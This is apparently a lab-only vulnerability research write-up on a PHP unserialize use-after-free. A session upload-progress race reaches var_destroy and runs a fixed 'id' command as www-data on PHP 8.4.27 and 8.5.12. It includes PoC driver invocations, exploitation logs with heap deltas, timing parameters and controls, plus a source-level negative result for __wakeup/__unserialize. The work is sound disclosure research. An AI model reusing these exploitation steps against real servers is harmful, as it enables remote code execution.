# CVE-2026-115560 — cleanup=On race (A) and delayed `__wakeup`/`__unserialize` (B')

**LAB-ONLY.** Fixed benign command `id>/tmp/vd 2>&1`; no arbitrary-command
interface. Published 2026-10-31 (`docs/RESPONSIBLE_PUBLICATION.md`). Work was done in new
containers/ports; `:18200` / `:18201` and their containers were not touched.

## TL;DR

| Item | Result |
|---|---|
| **A. cleanup=On race (8.4.27)** | ✅ lands, `uid=33` — 4/4 fire attempts (first attempt after a warm/remeasured delta) |
| **A. cleanup=On race (8.5.12)** | ✅ lands, `uid=33` — with automatic re-measure after the cold-start delta drift |
| **Two-record prime needed?** | **Yes.** With cleanup=On, `/prime.php`'s dummy is erased (`a:0:{}`). A persistent `/seed.php` record replaces it. Without a first record only `inv=1` exists and `m=4/m=5` skip it. |
| **B'. `__wakeup` / `__unserialize`** | ❌ **Negative on 8.4.27 and 8.5.12**, non-duplicate and duplicate keys. The delayed call runs (proven from `var_destroy`) but its nested `unserialize('R:1020;')` returns `false` — it takes the *fresh* context branch because `var_destroy` holds `BG(serialize_lock)` around the call. |

## New files

```
lab-115560/php-115560-race.ini       php_serialize + upload_progress On + cleanup On
lab-115560/apache-race.conf          4-8 prefork children, MaxConnectionsPerChild=1
lab-115560/docker-compose.race.yml   :18204 :18205 race; :18208 :18209 cleanup=Off diag
lab-115560/webroot/seed.php          persistent first session record (cleanup=On)
lab-115560/webroot/wakeup.php        CacheWakeup / CacheWakeupU consumer, m=4/5
lab-115560/webroot/decoy.php         dtor-count/backtrace diagnostic twin
poc/verify_115560_race.py            streaming upload + concurrent consumer driver
poc/verify_115560_wakeup.py          B' payload builder + measure/fire driver
```

No existing file was edited (`index.php`, `verify_115560_vardestroy.py`, shared
docs untouched).

## Bring-up

```bash
cd lab-115560
docker compose -p php2shell-115560-race -f docker-compose.race.yml up -d

# sanity: both race services are arm64 and cleanup=On
docker exec php2shell-115560-8427-race uname -m          # aarch64
docker exec php2shell-115560-8427-race php -i | grep upload_progress.cleanup
# session.upload_progress.cleanup => On => On
```

`platform: linux/arm64` is explicit in the compose file. Without it Docker
pulled the **amd64** variant under emulation: `uname -m` was `x86_64`, the
`libphp`/main mappings were at `0x5555…/0x7fff…`, `parse_maps` failed and the
arm64 delta calibration was meaningless. This is failure mode #1 below.

The pool needs **more than one child**: `apache-race.conf` uses
`StartServers 4 / MaxRequestWorkers 8 / MaxConnectionsPerChild 1`. The
streaming upload occupies one child; the consumer GET must run in another. All
children are forked from the same parent and inherit the same ZendMM `main`
chunk, so one measured delta is valid for the fire child.

## A. cleanup=On race

### Mechanism

1. A **streaming** multipart POST to `/prime.php` sends
   `PHP_SESSION_UPLOAD_PROGRESS` = `"|" + payload`, then 8 × 64 KiB file
   chunks with 0.6 s delays (~4.8 s window). The rfc1867 hook writes the
   progress record under `php_serialize`; with `cleanup=On` it is erased only
   at `MULTIPART_EVENT_END` (when the final boundary arrives).
2. After `settle=0.7 s`, a **concurrent GET** to `/index.php?m=5` (measure) or
   `?m=4` (fire) with the same `PHPSESSID` runs `ini_set('php')` +
   `session_start()`, reads the live session file and decodes the progress
   key's `|`-suffix with the `php` decoder.
3. The consumer sleeps in the real `var_destroy` dtor (`m=5`) or sprays and
   re-enters `unserialize('R:1020;')` (`m=4`).

The upload target is `/prime.php`, not `/index.php`: the rfc1867 hook only
needs to write the session file, and this avoids the upload request running the
app-side decode after the consumer has already fired.

### Two-record requirement (and why `/seed.php`)

`inv=1` is **not** a mid-parse duplicate-key destroy. The `/prime.php` dummy
payload is `PC.build_value(0, 0, …)`, which itself contains a
`CachePurge` object at `i:99999`; parsing that first record queues its dtor
(`inv=1`), and parsing the real second record queues the real dtor (`inv=2`).
`m=4/m=5` deliberately skip `inv=1` and act on `inv=2`.

With `cleanup=On` the `/prime.php` progress record is removed at the end of its
own upload:

```text
$ ls -l /tmp/sessions/sess_primeP…
-rw------- 1 www-data www-data 6 … /tmp/sessions/sess_primeP…
$ od -c …            # a : 0 : { }        (only an empty session array)
```

`/seed.php?d=1` persists a normal session variable whose *value* starts with
`"|"` + the same valid `a:1018` dummy array. The `php` decoder splits at that
`|`, parses the dummy as record #1 (queuing `inv=1`), then reaches the
progress key's `|` and parses the exploit as record #2 (`inv=2`). The seed key
survives cleanup because it is not an `upload_progress_*` key.

Negative control (single record, `--no-seed`, 8.4.27 and 8.5.12):

```text
[m] dtor_log='dtor m=5 inv=1 pid=141\nskip-first\nafter-session-start\nshutdown'
[!] measure consumer did not reach the dtor
[!] race did not produce the real var_destroy dtor
```

### Commands and observed output

Warm measurements are stable: **8.4.27 delta `0x6d875`**, **8.5.12 delta
`0x80875`**, main-window unchanged per container start.

```bash
# 8.4.27 (container php2shell-115560-8427-race, :18204)
python3 poc/verify_115560_race.py \
  --target 127.0.0.1:18204 --container php2shell-115560-8427-race \
  --build 8.4.27 --settle 0.7 --attempts 3 run
```

```text
[*] 115560 cleanup=On race (8.4.27)
    settle=0.7s chunks=8x64KiB delay=0.6s window~4.8s spray=3048
[m] measure attempt 1/4 sid=…
[m] dtor_log='dtor m=5 inv=1 pid=71\nskip-first\ndtor m=5 inv=2 pid=71\nsecond-measure-sleep'
[m] magic hits=2 raw-input=1
[m] pid=71 main=0xffff90200000 lib=0xffff922b0000 zif=0xffff926e1510
[m] … carrier=0xffff9026d889 value_string=0xffff9026d875 delta=0x6d875
[f] fire attempt 1/3 sid=…
[f] consumer=<none> proof='uid=33(www-data) gid=33(www-data) groups=33(www-data)'
[f] dtor_log='dtor m=4 inv=1 pid=128\nskip-first\ndtor m=4 inv=2 pid=128\nspray-done\nref=1020\nafter-unserialize\nfire-end'
[EVIDENCE] cleanup=On race -> 115560 var_destroy -> uid=33
```

```bash
# 8.5.12 (container php2shell-115560-8512-race, :18205)
python3 poc/verify_115560_race.py \
  --target 127.0.0.1:18205 --container php2shell-115560-8512-race \
  --build 8.5.12 --settle 0.7 --attempts 3 run
```

```text
[m] dtor_log='dtor m=5 inv=1 pid=20\nskip-first\ndtor m=5 inv=2 pid=20\nsecond-measure-sleep'
[m] main=0xffffb4c00000 lib=0xffffb1600000 zif=0xffffb1b35490 delta=0x80875
[f] dtor_log='dtor m=4 inv=1 … skip-first … dtor m=4 inv=2 … spray-done\nafter-unserialize\nfire-end'
[EVIDENCE] cleanup=On race -> 115560 var_destroy -> uid=33
```

Cold-start drift: the first race measure after a container (re)start returned
`delta=0x8c875` (8.4.27) / `0x9e875` (8.5.12) — `+0x1e000..0x20000` from the
warm value. The first fire then crashed after `spray-done` (wrong carrier). The
driver re-measures after a missed attempt and the next attempt lands:

```text
[f] fire attempt 1/3 … spray-done\nref=1020          (no proof)
[i] fire missed; re-measuring the carrier delta
[m] … delta=0x80875
[f] fire attempt 2/3 … proof='uid=33(www-data) …'
[EVIDENCE] cleanup=On race -> 115560 var_destroy -> uid=33
```

### Controls

| Control | Result |
|---|---|
| consumer after the window (`--settle 6.0`, upload window ~4.8 s) | only `inv=1` from the seed's dummy object; no real dtor, no proof |
| consumer with a different `PHPSESSID` | `dtor_log` only `after-session-start/shutdown`; no dtor |
| `--bias-zif 0x1000` | real dtor runs, `spray-done`, `after-unserialize`, **no proof** |
| no seed (single record) | only `inv=1`; `m=4/m=5` skip it; no measure/fire |
| `cleanup=Off` positive control (same carrier, `__destruct` gadget) | `uid=33` on both builds |

Timing summary: `settle=0.7 s`, `8 × 64 KiB` chunks, `0.6 s` between chunks
(`~4.8 s` live window), `Connection: close`. Larger `settle`/smaller window
fails as above; the GET→dtor path itself completes in a few tens of ms.

## B'. `__wakeup` / `__unserialize` re-entry

### Build

`poc/verify_115560_wakeup.py` takes the proven `PC.build_value()` carrier and
replaces the tail object:

```text
O:10:"CachePurge"   ->   O:11:"CacheWakeup"    (__wakeup,     11 chars)
                    ->   O:12:"CacheWakeupU"   (__unserialize, 12 chars)
```

`--placement nondup` changes the trailing key `i:99999;i:42;` to
`i:99998;i:42;` so the object stays in the array until `var_destroy`;
`--placement dup` keeps the duplicate-key control. `/wakeup.php` mirrors
`index.php` (same handler switch, same `m=4/5` semantics) and the gadget logs
its invocation, sprays, then calls `unserialize('R:1020;')`.

### Commands

```bash
python3 poc/verify_115560_wakeup.py \
  --target 127.0.0.1:18208 --container php2shell-115560-8427-offdiag \
  --build 8.4.27 --kind wakeup --placement nondup run

python3 poc/verify_115560_wakeup.py \
  --target 127.0.0.1:18209 --container php2shell-115560-8512-offdiag \
  --build 8.5.12 --kind unserialize --placement dup run
```

### Results — all negative

8.4.27 (`main=0xffffb0200000`, `delta=0x6c019`,
`zif=0xffffb2691510`):

```text
[m] wakeup_log='wakeup m=5 pid=20\nwakeup-measure-sleep'
[m] … delta=0x6c019
[f] wakeup_log='wakeup m=4 pid=22\nspray-done\nafter-unserialize type=boolean\nwakeup-end\nwakeup-dtor pid=22\nafter-session-start\nshutdown'
[NEGATIVE] no proof: the delayed call did not re-enter the freed var_entries chain
```

8.5.12 (`main=0xffff98200000`, `delta=0x6c019`,
`zif=0xffff95335490`):

```text
[f] wakeup_log='unserialize-fn m=4 … spray-done\nafter-unserialize type=boolean\nunserialize-fn-end\nunserialize-dtor …'
[NEGATIVE] no proof: the delayed call did not re-enter the freed var_entries chain
```

| build | kind | placement | wakeup/unserialize invoked | nested `R:1020` | proof |
|---|---|---|---|---|---|
| 8.4.27 | `__wakeup` | nondup | yes (`m=5` held) | `boolean` (false) | none |
| 8.4.27 | `__wakeup` | dup | yes | `boolean` | none |
| 8.4.27 | `__unserialize` | nondup | yes | `boolean` | none |
| 8.4.27 | `__unserialize` | dup | yes | `boolean` | none |
| 8.5.12 | `__wakeup` | nondup/dup | yes | `boolean` | none |
| 8.5.12 | `__unserialize` | nondup/dup | yes | `boolean` | none |

**Positive control:** the same measured carrier/`zif` with the proven
`__destruct` gadget against `/index.php` (same containers, same delta) fired
immediately on both builds:

```text
[EVIDENCE] 115560 session decode -> var_destroy -> uid=33
```

So the B' payloads were well-formed and the carrier address was correct; only
the delayed-call re-entry fails.

### Why it fails (source-level)

In `ext/standard/var_unserializer.re` (PHP-8.4 and PHP-8.5, `var_destroy()`),
the `var_entries` chain is freed first, then the `var_dtor` list is walked:

```c
while (var_hash) { next = var_hash->next; efree_size(var_hash, sizeof(var_entries)); … }

if (Z_EXTRA_P(zv) == VAR_WAKEUP_FLAG) {
    …
    BG(serialize_lock)++;                       /* <-- held across the call */
    zend_call_function(&fci, &fci_cache);
    BG(serialize_lock)--;
} else if (Z_EXTRA_P(zv) == VAR_UNSERIALIZE_FLAG) {
    …
    BG(serialize_lock)++;                       /* <-- held across the call */
    zend_call_known_instance_method_with_1_params(…);
    BG(serialize_lock)--;
}
i_zval_ptr_dtor(zv);                            /* <-- __destruct: UNLOCKED */
```

`php_var_unserialize_init()` takes the **fresh** branch whenever
`BG(serialize_lock)` is non-zero:

```c
if (BG(serialize_lock) || !BG(unserialize).level) { /* new context */ }
else { d = BG(unserialize).data; ++BG(unserialize).level; }  /* stale/UAF */
```

A nested `unserialize()` inside `__wakeup`/`__unserialize` therefore gets a
fresh, empty `entries` chain; `R:1020` is out of range and returns `false`.
Only the final `i_zval_ptr_dtor()` — the `__destruct` path — runs unlocked and
reuses the freed chain. The public hypothesis "wakeup/unserialize invoked from
var_destroy is a re-entry gadget" is **falsified for these builds**; it would
require a build where those branches do not take the lock.

## Failure modes seen

1. **Wrong architecture.** Compose without `platform: linux/arm64` selected
   the amd64 image under emulation; `uname -m` = `x86_64`, `parse_maps` failed
   (`lib=None, mains=[]`), and arm64 deltas/offsets do not apply.
2. **Single-worker Apache.** With `apache-single.conf` (1 child) the streaming
   upload occupies the only worker; the consumer queues until after
   `MULTIPART_EVENT_END`, by which time cleanup removed the record. The race
   needs `apache-race.conf`.
3. **Cold-start delta drift.** The first measure after a container restart was
   `+0x1e000..0x20000`; fire crashes after `spray-done`. Fixed by re-measuring
   after a miss (`--no-remeasure` disables that).
4. **`/prime.php` under cleanup=On** leaves `a:0:{}`; using it as the first
   record silently yields only `inv=1`. Use `/seed.php?d=1`.
5. **8.5 merged-VMA maps.** On some 8.5 layouts the 2 MiB ZendMM main VMA is
   merged with an adjacent anon VMA, so `php2shell.maps.parse_maps` (which
   requires an aligned VMA start) returns no `main`. The wakeup driver derives
   `main = value_string & ~0x1fffff` (the 2 MiB slot containing the carrier)
   instead; the delta still came out `0x6c019`.
6. **B' is not a re-entry.** Nested `unserialize()` under the delayed branches
   is lock-protected; use the `__destruct` variant.

## Scope

- Race proven with the lab `CachePurge` re-entry destructor and the fixed
  `id>/tmp/vd 2>&1` command only.
- The race needs a streaming upload (> a few seconds) and a second prefork
  child; a target that buffers the whole body before the hook, or a pool with
  one worker, is out of scope.
- B' remains a negative result: the gadget surface does **not** widen to
  state-restoring `__wakeup`/`__unserialize` on 8.4.27/8.5.12.
